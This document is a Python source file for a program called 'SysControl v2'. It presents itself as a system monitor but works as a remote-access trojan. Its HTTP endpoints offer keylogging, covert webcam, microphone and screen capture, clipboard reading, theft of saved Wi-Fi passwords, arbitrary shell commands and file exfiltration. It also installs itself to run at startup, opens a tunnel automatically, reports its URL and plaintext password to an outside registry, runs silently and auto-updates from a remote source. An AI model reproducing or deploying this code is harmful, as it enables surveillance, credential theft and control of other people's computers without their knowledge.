"""
SysControl v2 — Lightweight system monitor.
No Telegram. No .env. Password auth + JWT. Google Apps Script registry. Auto-tunnel.
Zero-config: auto-setup on first run using hostname.
"""
import os
import sys
import json
import time
import signal
import platform
import threading
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

import config
import auth
import tunnel
import registry
import updater
from features import screen, webcam, shell, files, system, audio, keylog, startup

PORT = 5000
VERSION = "1.0.0"

# ── Embedded HTML page ──────────────────────────────────────────────

STATUS_PAGE = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>SysControl Running</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#0a0e17;color:#e2e8f0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}}
.card{{background:#151d2e;border:1px solid #1e293b;border-radius:16px;padding:32px;width:100%;max-width:420px;text-align:center}}
h1{{font-size:24px;margin-bottom:4px}}
.sub{{color:#64748b;font-size:14px;margin-bottom:24px}}
.status{{color:#22c55e;font-size:16px;margin-bottom:20px}}
.info{{background:#111827;border:1px solid #1e293b;border-radius:8px;padding:14px;text-align:left;font-size:13px;line-height:2}}
.info b{{color:#3b82f6}}
.dim{{color:#64748b}}
.copy{{cursor:pointer;user-select:all}}
.copy:hover{{color:#3b82f6}}
.pw-box{{background:#1a2744;border:1px solid #3b82f6;border-radius:8px;padding:14px;margin-top:16px;text-align:center}}
.pw-box b{{color:#22c55e;font-size:14px}}
.pw-val{{font-family:monospace;font-size:20px;letter-spacing:1px;color:#f1f5f9;margin-top:6px;user-select:all;cursor:pointer;word-break:break-all}}
.pw-hint{{color:#64748b;font-size:11px;margin-top:8px}}
</style></head><body>
<div class="card">
<h1>SysControl</h1>
<p class="sub">Remote System Monitor</p>
<p class="status">&#9679; Server Running</p>
<div class="info">
<b>Device:</b> {device_name}<br>
<b>Device ID:</b> <span class="copy" title="Click to copy" onclick="navigator.clipboard.writeText('{device_id}')">{device_id}</span><br>
<b>Version:</b> {version}<br>
<b>Tunnel:</b> <span class="dim">{tunnel_status}</span><br>
<b>Registry:</b> <span class="dim">{registry_status}</span>
</div>
<div class="pw-box">
<b>Password for Remote Access</b>
<div class="pw-val" title="Click to copy" onclick="navigator.clipboard.writeText('{password}');this.style.color='#22c55e';setTimeout(function(){{document.querySelector('.pw-val').style.color=''}},800)">{password}</div>
<div class="pw-hint">Use this password to connect from the dashboard. Click to copy.</div>
</div>
<p style="color:#64748b;font-size:12px;margin-top:16px">This window can be closed. Server keeps running.</p>
</div></body></html>"""


# ── CORS + JSON helpers ──────────────────────────────────────────────

def json_bytes(obj, status=200):
    body = json.dumps(obj).encode()
    return status, "application/json", body


def require_auth(handler):
    token = auth.get_token_from_headers(dict(handler.headers))
    if not token:
        return None
    payload = auth.verify_token(token)
    return payload


# ── Post-setup: start tunnel + registry ──────────────────────────────

def start_tunnel_and_registry():
    cfg = config.get_config()
    if not cfg:
        return
    url = tunnel.start(PORT)
    if url:
        pw = cfg.get("password_plain", "")
        registry.register_url(
            cfg["device_id"], cfg["device_name"], url, pw, VERSION,
        )
        registry.heartbeat_loop(
            cfg["device_id"], cfg["device_name"],
            tunnel.get_url, pw, VERSION,
        )


# ── HTTP Handler ─────────────────────────────────────────────────────

class Handler(BaseHTTPRequestHandler):

    def log_message(self, *a):
        pass  # silent

    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")

    def _send(self, status, content_type, body):
        self.send_response(status)
        self._cors()
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _html(self, html, status=200):
        self._send(status, "text/html; charset=utf-8", html.encode())

    def _json(self, obj, status=200):
        s, ct, body = json_bytes(obj, status)
        self._send(s, ct, body)

    def _read_body(self):
        length = int(self.headers.get("Content-Length", 0))
        if length == 0:
            return {}
        return json.loads(self.rfile.read(length))

    def _auth_or_deny(self):
        payload = require_auth(self)
        if not payload:
            self._json({"ok": False, "error": "Unauthorized"}, 401)
        return payload

    # ── OPTIONS (CORS preflight) ──

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()

    # ── GET routes ──

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        qs = parse_qs(parsed.query)

        # Root — status page
        if path == "/" or path == "":
            cfg = config.get_config()
            t_url = tunnel.get_url()
            html = STATUS_PAGE.format(
                device_name=cfg.get("device_name", "Unknown") if cfg else "Unknown",
                device_id=cfg.get("device_id", "") if cfg else "",
                version=VERSION,
                tunnel_status=t_url if t_url else "Connecting...",
                registry_status="Google Apps Script" if registry.GAS_URL else "Not configured",
                password=cfg.get("password_plain", "N/A") if cfg else "N/A",
            )
            self._html(html)
            return

        if path == "/api/status":
            self._json({
                "ok": True,
                "version": VERSION,
                "device": config.get_device_name(),
                "os": platform.system() + " " + platform.release(),
            })
            return

        if path == "/api/update/status":
            if not self._auth_or_deny():
                return
            self._json(updater.get_status())
            return

        if path == "/api/screen-live":
            if not self._auth_or_deny():
                return
            q = qs.get("q", ["med"])[0]
            data = screen.live_frame(q)
            self._send(200, "image/jpeg", data)
            return

        if path == "/api/webcam-live":
            if not self._auth_or_deny():
                return
            q = qs.get("q", ["med"])[0]
            frame = webcam.read_live_frame(q)
            if frame:
                self._send(200, "image/jpeg", frame)
            else:
                self._json({"ok": False, "error": "No frame"}, 503)
            return

        if path == "/api/mic/chunk":
            if not self._auth_or_deny():
                return
            chunk = audio.mic_chunk()
            if chunk:
                self._send(200, "audio/wav", chunk)
            else:
                self._json({"ok": False, "text": "no data"})
            return

        if path == "/api/keylog/data":
            if not self._auth_or_deny():
                return
            self._json({
                "ok": True,
                "running": keylog.is_running(),
                "available": keylog.is_available(),
                "count": keylog.get_count(),
                "data": keylog.get_data(),
            })
            return

        self._json({"ok": False, "error": "Not found"}, 404)

    # ── POST routes ──

    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path

        # ── Public: login ──
        if path == "/api/login":
            body = self._read_body()
            pw = body.get("password", "")
            if config.verify_password(pw):
                token = auth.create_token(config.get_device_id())
                self._json({"ok": True, "token": token, "device": config.get_device_name(), "version": VERSION})
            else:
                self._json({"ok": False, "error": "Wrong password"}, 401)
            return

        # ── All routes below require auth ──
        payload = self._auth_or_deny()
        if not payload:
            return

        if path == "/api/cmd":
            body = self._read_body()
            cmd = body.get("cmd", "").strip()
            self._handle_cmd(cmd)
            return

        if path == "/api/upload":
            body = self._read_body()
            result = files.upload_file(body.get("path", ""), body.get("name", ""), body.get("data", ""))
            self._json(result)
            return

        if path == "/api/read-file":
            body = self._read_body()
            result = files.read_file(body.get("path", ""))
            self._json(result)
            return

        if path == "/api/save-file":
            body = self._read_body()
            result = files.save_file(body.get("path", ""), body.get("content", ""), body.get("encoding", "utf-8"))
            self._json(result)
            return

        if path == "/api/update/check":
            info = updater.check_update(VERSION)
            if info:
                self._json({"ok": True, "update_available": True, "current": VERSION, **info})
            else:
                self._json({"ok": True, "update_available": False, "current": VERSION})
            return

        if path == "/api/update/apply":
            body = self._read_body()
            url = body.get("download_url", "")
            version = body.get("version", "")
            if not url or not version:
                self._json({"ok": False, "error": "Missing download_url or version"})
                return
            self._json({"ok": True, "text": "Updating to v" + version + "..."})
            threading.Thread(
                target=lambda: updater.apply_update({"download_url": url, "version": version}),
                daemon=True,
            ).start()
            return

        if path == "/api/webcam/start":
            ok = webcam.start_live()
            self._json({"ok": ok, "error": "" if ok else "Camera unavailable"})
            return

        if path == "/api/webcam/stop":
            webcam.stop_live()
            self._json({"ok": True})
            return

        if path == "/api/mic/start":
            result = audio.mic_start()
            self._json(result)
            return

        if path == "/api/mic/stop":
            result = audio.mic_stop()
            self._json(result)
            return

        if path == "/api/keylog/start":
            ok = keylog.start()
            self._json({"ok": ok})
            return

        if path == "/api/keylog/stop":
            keylog.stop()
            self._json({"ok": True})
            return

        if path == "/api/keylog/clear":
            keylog.clear()
            self._json({"ok": True})
            return

        if path == "/api/update/check":
            info = updater.check_update()
            self._json({"ok": True, "update": info})
            return

        if path == "/api/update/apply":
            info = updater.check_update()
            if info:
                updater.apply_update(info)
                self._json({"ok": True, "version": info["version"]})
            else:
                self._json({"ok": False, "error": "No update available"})
            return

        self._json({"ok": False, "error": "Not found"}, 404)

    def _handle_cmd(self, cmd):
        if not cmd:
            self._json({"type": "text", "text": "Empty command"})
            return

        if cmd == "/screen":
            data = screen.screenshot_jpeg()
            import base64
            self._json({"type": "photo", "data": "data:image/jpeg;base64," + base64.b64encode(data).decode()})
            return

        if cmd == "/webcam":
            data = webcam.capture_jpeg()
            if data:
                import base64
                self._json({"type": "photo", "data": "data:image/jpeg;base64," + base64.b64encode(data).decode()})
            else:
                self._json({"type": "text", "text": "Webcam unavailable — no camera detected"})
            return

        if cmd == "/sys":
            info = system.get_system_info()
            lines = [f"{k}: {v}" for k, v in info.items()]
            self._json({"type": "text", "text": "\n".join(lines)})
            return

        if cmd == "/ip":
            ip = system.get_public_ip()
            self._json({"type": "text", "text": f"Public IP: {ip}"})
            return

        if cmd == "/clipboard":
            text = system.get_clipboard()
            self._json({"type": "text", "text": text or "(empty clipboard)"})
            return

        if cmd == "/wifi":
            profiles = system.get_wifi_passwords()
            if profiles:
                lines = [f"{p['ssid']} | {p['password']}" for p in profiles]
                self._json({"type": "text", "text": "\n".join(lines)})
            else:
                self._json({"type": "text", "text": "No Wi-Fi profiles found"})
            return

        if cmd == "/lock":
            system.lock_screen()
            self._json({"type": "text", "text": "Screen locked"})
            return

        if cmd == "/shutdown":
            system.shutdown()
            self._json({"type": "text", "text": "Shutting down in 5 seconds..."})
            return

        if cmd.startswith("/speech "):
            text = cmd[8:].strip()
            if text:
                audio.speak(text)
                self._json({"type": "text", "text": f"Speaking: {text}"})
            else:
                self._json({"type": "text", "text": "Usage: /speech <text>"})
            return

        if cmd == "/drives":
            drives = files.list_drives()
            self._json({"type": "drives", "drives": drives})
            return

        if cmd.startswith("/browse"):
            path = cmd[7:].strip() or None
            result = files.browse(path)
            result["type"] = "browse"
            self._json(result)
            return

        if cmd.startswith("/download "):
            path = cmd[10:].strip()
            result = files.download_file(path)
            if result:
                result["type"] = "file"
                self._json(result)
            else:
                self._json({"type": "text", "error": "File not found"})
            return

        if cmd.startswith("/delete "):
            path = cmd[8:].strip()
            result = files.delete_path(path)
            self._json(result)
            return

        if cmd.startswith("/rename "):
            parts = cmd[8:].strip().split("|", 1)
            if len(parts) == 2:
                result = files.rename_path(parts[0].strip(), parts[1].strip())
                self._json(result)
            else:
                self._json({"ok": False, "error": "Usage: /rename path|newname"})
            return

        if cmd.startswith("/mkdir "):
            result = files.mkdir(cmd[7:].strip())
            self._json(result)
            return

        if cmd.startswith("/mkfile "):
            result = files.mkfile(cmd[8:].strip())
            self._json(result)
            return

        if cmd == "/update":
            info = updater.check_update(VERSION)
            if info:
                text = f"Update available!\nCurrent: v{VERSION}\nLatest: v{info['version']}"
                if info.get("notes"):
                    text += f"\nNotes: {info['notes']}"
                text += "\n\nUse the Update button or send /update now"
                self._json({"type": "text", "text": text})
            else:
                self._json({"type": "text", "text": f"Up to date (v{VERSION})"})
            return

        if cmd == "/update now":
            info = updater.check_update(VERSION)
            if not info:
                self._json({"type": "text", "text": "Already up to date"})
                return
            self._json({"type": "text", "text": f"Downloading v{info['version']}... Device will restart."})
            threading.Thread(
                target=lambda: updater.apply_update(info),
                daemon=True,
            ).start()
            return

        if cmd == "/startup":
            s = startup.status()
            text = "Startup: " + ("Enabled" if s["enabled"] else "Disabled")
            if s["exe"]:
                text += "\nPath: " + s["exe"]
            self._json({"type": "text", "text": text})
            return

        if cmd == "/startup on":
            result = startup.enable()
            self._json({"type": "text", "text": "Startup enabled" if result.get("ok") else "Failed: " + result.get("error", "")})
            return

        if cmd == "/startup off":
            startup.disable()
            self._json({"type": "text", "text": "Startup disabled"})
            return

        if cmd.startswith("/shellcmd"):
            raw = cmd[9:].strip()
            result = shell.run(raw)
            result["type"] = "shell"
            self._json(result)
            return

        result = shell.run(cmd)
        result["type"] = "shell"
        self._json(result)


# ── Startup ──────────────────────────────────────────────────────────

def kill_port_holder(port):
    """Kill any other process using our port (e.g. old v1 bot)."""
    if sys.platform != "win32":
        return
    try:
        import subprocess
        my_pid = os.getpid()
        result = subprocess.run(
            ["netstat", "-ano"], capture_output=True, text=True, timeout=5,
            creationflags=0x08000000,
        )
        for line in result.stdout.splitlines():
            if f":{port}" in line and "LISTENING" in line:
                parts = line.split()
                pid = int(parts[-1])
                if pid != my_pid and pid != 0:
                    subprocess.run(
                        ["taskkill", "/PID", str(pid), "/F"],
                        capture_output=True, timeout=5,
                        creationflags=0x08000000,
                    )
                    time.sleep(1)
    except Exception:
        pass


def main():
    # Auto-start registration first — even if server fails, next boot will retry
    startup.auto_setup()

    # Zero-config: auto-setup if not configured
    if not config.is_configured():
        config.auto_setup()
    elif not config.get_password():
        config.reset_password()

    for attempt in range(3):
        try:
            server = ThreadingHTTPServer(("0.0.0.0", PORT), Handler)
            break
        except OSError:
            if attempt < 2:
                kill_port_holder(PORT)
            else:
                raise

    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()

    auth.init_secret()
    threading.Thread(target=start_tunnel_and_registry, daemon=True).start()
    updater.auto_update_loop()

    try:
        signal.pause()
    except AttributeError:
        try:
            while True:
                time.sleep(3600)
        except KeyboardInterrupt:
            pass
    finally:
        tunnel.stop()
        cfg = config.get_config()
        if cfg:
            registry.set_offline(cfg["device_id"])


def safe_main():
    """Crash recovery — if main() dies, wait and retry forever."""
    while True:
        try:
            main()
            break
        except SystemExit:
            break
        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(10)


if __name__ == "__main__":
    safe_main()
